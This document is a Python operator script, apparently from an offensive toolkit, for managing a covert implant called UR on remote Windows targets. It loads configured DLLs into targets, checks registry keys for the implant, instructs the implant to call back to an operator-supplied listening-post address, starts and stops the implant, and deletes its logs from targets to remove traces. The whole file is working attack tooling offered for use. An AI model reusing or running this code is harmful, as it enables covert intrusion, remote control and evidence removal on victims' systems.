# DoubleFeature script version 3

import dsz
import dsz.file
import dsz.lp
import dsz.path
import dsz.process
import dsz.version
import random
import string
import sys
import os.path

g_default_logfile = ""
g_dfversion = "DOUBLEFEATURE 3.4.3.3"
g_dftool = "DoubleFeatureDll.dll.unfinalized"
g_dfconfiguretool = "AddResource.exe"
g_dfreader = "DoubleFeatureReader.exe"
g_dfrscfile = "Df_Rsc.txt"
g_debug_log = "~yh56816.tmp"
g_envdebug = "_DF_UR_DEBUG"


def main():
        result = setup()
        if result is None:
                return False
        (key, logfile) = result
        isclean = False
                
        while not isclean:
                menuloop(key, logfile)
                isclean = cleanup(logfile, g_debug_log)

        try:
                if dsz.ui.Prompt("Would you like to report a problem with UR?", True):
                        problemStr = dsz.ui.GetString("Enter a description of the problem you are seeing:")
                        dsz.cmd.Run("problem UnitedRake " + problemStr)
        except:
                pass
        
        return True

def menuloop(key, logfile):

        dsz.ui.Echo("")
        
        menuoption = -1

        #Need to do this temporary crap to handle 32 bit op boxes and 64 bit
        #targets, since 32 bit AddResource cannot modify 64 bit binaries
        if dsz.version.checks.IsOs64Bit() and not dsz.version.checks.IsOs64Bit(dsz.script.Env["local_address"]):
                key = "badc0deb33ff00d"
                while menuoption != 0:
                        for i in (
                                (""),
                                (g_dfversion + " - temporary menu"),
                                ("  Encryption key: %s" % key),
                                ("  Log file: %s" % logfile),
                                (""),
                                ("  0)  Exit"),
                                (""),
                                ("Setup"),
                                (""),
                                ("Normal Usage"),
                                ("  1) Run Standard DF query"),
                                ("  2) Enable UR Logging"),
                                ("  3) Disable UR Logging"),
                                ("  4) Check registry for special UR key"),
                                (""),
                                ("Advanced Usage"),
                                ("  5) Run a DF3 dll you configured"),
                                (""),):
                                dsz.ui.Echo(i)
                        menuoption = dsz.ui.GetInt("Enter menu option:", "0")
                        ret = None
                        for choice, action in (
                                (1, lambda: dostandard64bitdll(logfile, key)),
                                (2, lambda: do64bitEnableLogging(logfile, key)),
                                (3, lambda: do64bitDisableLogging(logfile, key)),
                                (4, lambda: geturguid()),
                                (5, lambda: docustomdll(logfile, key))):
                                        if menuoption == choice:
                                                ret = action()

        else:
        
                while menuoption != 0:
                        for i in (
                                (""),
                                (g_dfversion),
                                ("  Encryption key: %s" % key),
                                ("  Log file: %s" % logfile),
                                (""),
                                ("  0)  Exit"),
                                (""),
                                ("Setup"),
                                ("  1)  Change encryption key"),
                                ("  2)  Change log file"),
                                (""),
                                ("Normal Usage"),
                                ("  3)  Check registry for special UR key"),
                                ("  4)  Run Standard DF query"),
                                ("  5)  Tip-Off UR"),
                                (""),
                                ("Advanced Usage"),
                                ("  6) Enable UR Debug Logging"),
                                ("  7) Disable UR Debug Logging"),
                                ("  8) Kick-start UR"),
                                ("  9) Shutdown UR"),
                                ("  10) Toggle FA Mode"),
                                (""),
                                ("God Mode"),
                                ("  11) Run a DF3 dll you already configured"),
                                ("  12) Manually configure DF. Still uses the above log file and key. Make sure you know what you're doing here"),
                                (""),):
                                dsz.ui.Echo(i)
                        menuoption = dsz.ui.GetInt("Enter menu option:", "0")
                        ret = None
                        for choice, action in (
                                (1, lambda: changekey(key)),
                                (2, lambda: dsz.ui.GetString("Enter logfile path:", logfile)),
                                (3, lambda: geturguid()),
                                (4, lambda: dfquery(logfile, key)),
                                (5, lambda: urtipoff(logfile, key)),
                                (6, lambda: enabledebuglogging(logfile, key)),
                                (7, lambda: disabledebuglogging(logfile, key)),
                                (8, lambda: urkickstart(logfile, key)),
                                (9, lambda: urshutdown(logfile, key)),
                                (10, lambda: urtogglefa(logfile, key)),
                                (11, lambda: docustomdll(logfile, key)),
                                (12, lambda: manualconfigure(logfile, key))):
                                        if menuoption == choice:
                                                ret = action()
                        if menuoption < 1 or menuoption > 2:
                                continue
                        if menuoption == 1:
                                key = ret
                        elif menuoption == 2:
                                logfile = ret

def dostandard64bitdll(logfile, key):
        dsz.ui.Echo("Running the DF Standard query")
        configuredDllPath = g_dftool.replace("unfinalized", "standard")

        dsz.ui.Echo("Ready to run tool...")
        dsz.control.echo.On()
        dsz.cmd.Prompt('dllload -ordinal 1 -library "%s"'%(configuredDllPath))
        dsz.control.echo.Off()
        
        dsz.ui.Echo("Finished.")
        parselog(logfile, key)

def do64bitEnableLogging(logfile, key):
        dsz.ui.Echo("Running the DF to Enable Logging")
        configuredDllPath = g_dftool.replace("unfinalized", "EnableLogging")

        dsz.ui.Echo("Ready to run tool...")
        dsz.control.echo.On()
        dsz.cmd.Prompt('dllload -ordinal 1 -library "%s"'%(configuredDllPath))
        dsz.control.echo.Off()
        
        dsz.ui.Echo("Finished.")
        parselog(logfile, key)
        
def do64bitDisableLogging(logfile, key):
        dsz.ui.Echo("Running the DF to Disable Logging")
        configuredDllPath = g_dftool.replace("unfinalized", "DisableLogging")

        dsz.ui.Echo("Ready to run tool...")
        dsz.control.echo.On()
        dsz.cmd.Prompt('dllload -ordinal 1 -library "%s"'%(configuredDllPath))
        dsz.control.echo.Off()
        
        dsz.ui.Echo("Finished.")
        parselog(logfile, key)
        
def docustomdll(logfile, key):
        configuredDllPath = dsz.ui.GetString("Enter the path to the DF3 dll you configured")
        logfile = dsz.ui.GetString("Enter the output file path", logfile)
        key = dsz.ui.GetString("Enter the key you configured it with", key)

                                 
        dsz.ui.Echo("Ready to run tool...")
        dsz.control.echo.On()
        dsz.cmd.Prompt('dllload -ordinal 1 -library "%s"'%(configuredDllPath))
        dsz.control.echo.Off()
        
        dsz.ui.Echo("Finished.")
        parselog(logfile, key)                         

def changekey(current):
        key = dsz.ui.GetString("Enter hex encryption key (up to 128-bits, or NONE):", current)
        if string.upper(key) == "NONE":
                key = None
        else:
                for i in key:
                        if i not in "0123456789abcdefABCDEF":
                                dsz.ui.Echo("Invalid hex key. Keeping your original key.", dsz.WARNING)
                                key = current
                                break
                if len(key) > 32:
                        key = key[0:32]
                        dsz.ui.Echo("Key truncated to 128-bits: %s" % key, dsz.WARNING)
        return key

def geturguid():
        dsz.control.echo.On()
        if not dsz.cmd.Run('registryquery -hive l -key "Software\Classes\CLSID\{091FD378-422D-A36E-8487-83B57ADD2109}\TypeLib"', dsz.RUN_FLAG_RECORD):
                dsz.ui.Echo("Special registry key NOT present.", dsz.WARNING)
        else:
                [urguid,] = dsz.cmd.data.Get("key::value::value", dsz.TYPE_STRING)
                if dsz.cmd.Run('registryquery -hive l -key "Software\Classes\CLSID\%s\InprocServer32"' % urguid):
                        dsz.ui.Echo("UR registry is present.", dsz.GOOD)
                else:
                        dsz.ui.Echo("UR registry is NOT present. (This is OK on UR 4.5+)", dsz.WARNING)
        dsz.control.echo.Off()
        dsz.ui.Pause("Continue?")

def dfquery(logfile, key):
        dsz.ui.Echo("Running the DF Standard query")
        options = "-l"

        dfputid = runtool(options, logfile, key)
        parselog(logfile, key)

def manualconfigure(logfile, key):
        options = dsz.ui.GetString("Enter the string to configure DF with:")

        dsz.ui.Echo("Verify the options are correct before continuing. Incorrect options could cause adverse effects to the target!!", dsz.WARNING)
        if dsz.ui.Prompt("Manual DoubleFeature Arguments: %s" % (options)):
                runtool(options, logfile, key)
                parselog(logfile, key)

def urtipoff(logfile, key):
        lpip = dsz.ui.GetString("Enter LP address:")
        lpport = dsz.ui.GetString("Enter LP port:")
        options = "-t%s:%s" % (lpip, lpport)

        dsz.ui.Echo("Verify your LP address and port before continuing.", dsz.WARNING)
        if dsz.ui.Prompt("Tip off UR to call out to %s:%s?" % (lpip, lpport)):
                dfputid = runtool(options, logfile, key)
                parselog(logfile, key)

def enabledebuglogging(logfile, key):
        dsz.env.Set(g_envdebug, "true")
        options = "-d on"
        runtool(options, logfile, key)
        parselog(logfile, key)

def urtogglefa(logfile, key):
        options = "-f"
        runtool(options, logfile, key)
        parselog(logfile, key)

def disabledebuglogging(logfile, key):
        options = "-d off"

        runtool(options, logfile, key)
        dsz.env.Set(g_envdebug, "false")
        parselog(logfile, key)
        if getlog(g_debug_log) is None:
                dsz.ui.Echo("No debug log file present. If UR is installed it may be asleep or not be running.", dsz.WARNING)
        else:
                dsz.ui.Echo("Note: No auto-parsing of debug log will occur; you must do this yourself.")

def urkickstart(logfile, key):
        if not dsz.ui.Prompt("Are you sure that Killsuit and UR are both installed and UR just isn't running?"):
                dsz.ui.Echo("User chose to bail.")
                return None
        options = "-k U"

        runtool(options, logfile, key)
        parselog(logfile, key)
        dsz.ui.Pause("Wait a couple of minutes to give UR time to start up before continuing.")
  


def urshutdown(logfile, key):
        if not dsz.ui.Prompt("Are you sure you want to shut down UR? Remember the restrictions.", True):
                dsz.ui.Echo("User chose to bail.")
                return None
        options = "-s U"

        runtool(options, logfile, key)
        parselog(logfile, key)
        dsz.ui.Pause("Wait a couple of minutes to give UR time to shut down before continuing.")

def parselog(logfile, key):

        result = getlog(logfile)
        if result is None:
                dsz.ui.Echo("No DF logfile to get.")
                return None
        (localname, localdir) = result
        dsz.ui.Echo("Auto-parsing DoubleFeature log...")
        dsz.control.echo.On()
        if key is None:
                key = "51E6E45"
        dsz.cmd.Run('local run -redirect -output oem -command "%s %s/NOSEND/%s %s"' % (g_dfreader, localdir, localname, key))
        dsz.control.echo.Off()

        #copy the created public key file into the nosend directory. This could be done more intelligently
        #if you were willing to parse the created log file.
        dsz.cmd.Run('local run -command "cmd.exe /C move *_public_key.bin %s/NOSEND"' %(localdir))
        
        dsz.ui.Pause("Continue?")

def getlog(log):
        if not dsz.file.Exists(log):
                return None
        dsz.control.echo.On()
        dsz.cmd.Run('dir "%s"' % log)
        dsz.control.echo.Off()
        localname = None
        localdir = None
        if dsz.cmd.Prompt('foreground get "%s" -name DFReport_'       % log, dsz.RUN_FLAG_RECORD):
                localname = dsz.cmd.data.Get("FileLocalName::LocalName", dsz.TYPE_STRING)[0]
		localdir = os.path.join(dsz.lp.GetLogsDirectory(), dsz.cmd.data.Get("LocalGetDirectory::Path", dsz.TYPE_STRING)[0])
                dsz.cmd.Run("local fileattributes -file %s\\%s -replace Normal" % (localdir, localname) )
                dsz.cmd.Run("local mkdir %s\\NOSEND" % localdir)
                dsz.cmd.Run("local move %s\\%s %s\\NOSEND\\%s" % (localdir, localname, localdir, localname))
                dsz.ui.Echo("Log file moved into NOSEND.")
        if not dsz.cmd.Prompt('delete -file "%s"' % log):
                dsz.ui.Echo("", dsz.WARNING)
                dsz.ui.Echo("Log file NOT deleted from target - Don't forget to do this yourself!", dsz.WARNING)
                dsz.ui.Echo("Useful pastable for when you want to do this:", dsz.WARNING)
                dsz.ui.Echo('  delete -file "%s"' % log, dsz.WARNING)
                dsz.ui.Echo("", dsz.WARNING)
                dsz.ui.Pause("Continue?")
        
        return (localname, localdir)


def setup():
        global g_dftool, g_dfconfiguretool, g_dfreader, g_dfrscfile, g_default_logfile, g_envdebug, g_debug_log
        dsz.control.echo.Off()
        
        if not dsz.version.checks.IsWindows():
                dsz.ui.Echo("DF requires Windows OS")
                return None
        if not dsz.version.checks.windows.Is2000OrGreater():
                dsz.ui.Echo("DF requires Win2k or greater.")
                return None

        if not DoDEMICheck():
                dsz.ui.Echo("DEMI check failed")
                return None
        
        (windir, sysdir) = dsz.path.windows.GetSystemPaths()
        resdir = dsz.lp.GetResourcesDirectory()

        g_default_logfile = "%s\\Temp\\~yh64762.tmp" % windir
        logfile = g_default_logfile
        g_debug_log = "%s\\Temp\\~yh56816.tmp" % windir
        g_envdebug_l = "_DF_UR_DEBUG"
        
        if not dsz.env.Check(g_envdebug_l):
                dsz.env.Set(g_envdebug_l, "false")

        if(dsz.version.checks.IsOs64Bit(dsz.script.Env["local_address"])):
                local_arch = "x64"
        else:
                local_arch = "i386"

        if(dsz.version.checks.IsOs64Bit()):
                remote_arch = "x64"
        else:
                remote_arch = "i386"

        local_os = "winnt"
        remote_os = "winnt"
        dfproj = "Df"
        g_dftool = "%s\\%s\\Uploads\\%s-%s\\%s"%(resdir, dfproj, remote_arch, remote_os, g_dftool)
        g_dfconfiguretool = "%s\\%s\\Tools\\%s-%s\\%s"%(resdir, dfproj, remote_arch, remote_os, g_dfconfiguretool)
        g_dfreader = "%s\\%s\\Tools\\%s-%s\\%s"%(resdir, dfproj, local_arch, local_os, g_dfreader)
        g_dfrscfile = "%s\\%s\\Tools\\%s-%s\\%s"%(resdir, dfproj, remote_arch, remote_os, g_dfrscfile)
        
        key = hex(random.randint(0x10000000000000000000000000000000,0xffffffffffffffffffffffffffffffff))[2:-1]
                
        return (key, logfile)

def DoDEMICheck():
        
        if dsz.cmd.Run("plugins", dsz.RUN_FLAG_RECORD):
            # got the list -- save the data
               
                names = dsz.cmd.data.Get("remote::plugin::name", dsz.TYPE_STRING)
                ids = dsz.cmd.data.Get("remote::plugin::id", dsz.TYPE_INT)

                demiID = 0

                for i in range(len(names)):
                        if names[i] == "KillSuit_Implant":
                                demiID = ids[i]
                if demiID != 0:
                        if dsz.ui.Prompt("DecibelMinute(kisu) is loaded on target? It must be unloaded prior to DF runs. Do that now? (Y/N)"):
                                dsz.control.echo.On()
                                if not dsz.cmd.Run("freeplugin -id %s"%demiID, dsz.RUN_FLAG_RECORD):
                                        dsz.ui.Echo("Error freeing plugin! Are you currently connected? Disconnect and try again!", dsz.ERROR)
                                        dsz.control.echo.Off()
                                        return False
                                else:
                                        dsz.control.echo.Off()
                                        return True
                                
                        else:
                                return False
                else:
                        return True

        # do something with the returned data
        else:
            dsz.ui.Echo("Running Plugins failed!")
            return False

        return False

def cleanup(logfile, debug_log):

        if dsz.env.Get(g_envdebug) != "false":
                dsz.ui.Echo("UR debug logging was (possibly) left on!", dsz.WARNING)
                if dsz.ui.Prompt("Return to menu to fix this?"):
                        return False
                dsz.ui.Echo("User chose to continue.", dsz.WARNING)

        filestoclean = []
        
        if dsz.file.Exists(logfile):
                if dsz.ui.Prompt("DoubleFeature log file is still on target. Remove it now?"):
                        if not dsz.cmd.Run('delete -file "%s"' % logfile):
                                dsz.ui.Echo("Failed to delete file.")
                                filestoclean += [logfile]
                else:
                        filestoclean += [logfile]


        if dsz.file.Exists(g_debug_log):
                if dsz.ui.Prompt("UR debug log file is still on target. Remove it now?"):
                        if not dsz.cmd.Run('delete -file "%s"' % g_debug_log):
                                dsz.ui.Echo("Failed to delete file.")
                                filestoclean += [g_debug_log]
                else:
                        filestoclean += [g_debug_log]
        
        if filestoclean != []:
                dsz.ui.Echo("", dsz.WARNING)
                dsz.ui.Echo("Files left on target! Either cleaning failed or user chose to skip.", dsz.WARNING)
                dsz.ui.Echo("Here are some potentially useful pastables if you change your mind:", dsz.WARNING)
                dsz.ui.Echo("", dsz.WARNING)
                for i in filestoclean:
                        dsz.ui.Echo('   delete -file "%s"' % i, dsz.WARNING)
                dsz.ui.Echo("", dsz.WARNING)
        else:
                dsz.ui.Echo("No files left on target.", dsz.GOOD)

        return True

def runtool(options, logfile, key):

        if key is not None:
                options = "-a %s %s" % (key, options)
        if (logfile != g_default_logfile):
                options = "%s -p %s" % (options, logfile)

        configuredDllPath = configuredll(options)

        if not DoDEMICheck():
                dsz.ui.Echo("DEMI check failed. Not running tool..", dsz.WARNING)
                return
                                
        dsz.ui.Echo("Ready to run tool...")
        dsz.lp.RecordToolUse("DoubleFeature", "3.3.0.3", options)
        dsz.control.echo.On()
        dsz.cmd.Prompt('dllload -ordinal 1 -library %s'%(configuredDllPath))
        dsz.control.echo.Off()
        dsz.cmd.Run('local delete -file %s'%(configuredDllPath))
        
        dsz.ui.Echo("Finished.")
        


def configuredll(options):

        configureddllpath = g_dftool.replace(".unfinalized",
                                             ".configured")
        dsz.cmd.Run("local copy %s %s"%(g_dftool,configureddllpath))

        f = open(g_dfrscfile, "wt")
        f.write(options)
        f.close()
        
        dsz.ui.Echo("Configuring the Dll with options: %s..."% (options))
        dsz.cmd.Run('local run -redirect -command "%s cmpf 6 1104 %s %s"' %
                   (g_dfconfiguretool, configureddllpath, g_dfrscfile))

        return configureddllpath


if __name__ == '__main__':
        if (main() != True):
                dsz.ui.Echo("Script aborted due to errors.", dsz.WARNING)
                sys.exit(-1)
